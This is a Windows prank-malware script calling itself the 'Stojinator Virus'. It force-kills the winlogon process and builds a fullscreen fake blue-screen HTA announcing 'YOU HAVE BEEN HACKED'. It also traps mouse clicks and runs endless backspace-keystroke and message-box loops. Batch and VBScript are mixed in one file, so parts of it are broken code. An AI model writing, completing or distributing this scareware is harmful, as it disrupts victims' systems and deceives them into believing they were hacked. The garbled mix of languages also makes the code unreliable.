@echo off


MsgBox "ERROR04784-740-458"
Set wshShell =wscript.CreateObject("WScript.Shell")
do
wscript.sleep 100
wshshell.sendkeys "{bs}"
loop

md %random% | start yooooo.mp4

taskkill /f /im "winlogon"
(

echo ^<html^>^<head^>^<title^>Microsoft Windows^</title^> 
echo. 
echo ^<hta:application id="oBVC" 
echo applicationname="BSOD"  
echo version="1.0" 
echo maximizebutton="no" 
echo minimizebutton="no" 
echo sysmenu="no" 
echo Caption="no" 
echo windowstate="maximize"/^> 
echo. 
echo ^</head^>^<body bgcolor="#000088" scroll="no"^> 
echo ^<font face="Lucida Console" size="4" color="white"^>  
echo ^<p^>YOU HAVE BEEN HACKED BY THE STOJINATOR VIRUS!.^</p^> 
echo. 
echo ^<p^>DRIVER_IRQL_NOT_LES_OR_EQUAL^</p^> 
echo. 
echo ^<p^>If this is the first time you've seen this stop error screen, restart your computer, If this screen appears again, follow these steps:^</p^> 
echo. 
echo ^<p^>Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any windows updates you might need.^</p^> 
echo. 
echo ^<p^>If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.^</p^> 
echo. 
echo ^<p^>Technical information:^</p^> 
echo. 
echo ^<p^>*** STOP: 0x00D1 ^(0x00C,0x002,0x00,0xF86B5A89^)^</p^> 
echo. 
echo. 
echo ^<p^>***  gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^</p^> 
echo. 
echo ^<p^>Beginning dump of physical memory^</p^> 
echo ^<p^>Physical memory dump complete.^</p^> 
echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^> 
echo.
echo. 
echo ^</font^> 
echo ^</body^>
echo.
echo ^<script language="javascript"^>
echo function noClick^(^) {
echo if ^(^(event.button==1^)^|^|^(event.button==2^)^) {
echo alert^('Error: 00101100x00100100 missing keymgr.dll'^)
echo }
echo }
echo document.onmousedown=noClick
echo ^</script^>
echo.  
echo ^</html^> 
) > bsod.hta 

start "" /wait "bsod.hta"

del /f /q "bsod.hta" > nul

do
wscript.sleep 100
wshshell.sendkeys "{bs}"
loop

Set Obj = CreateObject("WScript.Shell")
Do
    X = MsgBox("You've been hacked by the Stojinator Virus", 0+48, "Bruh")
    If X = 1 Then
        Obj.Run "bruh.wav", 0, False
    End If
    WScript.Sleep 100
Loop


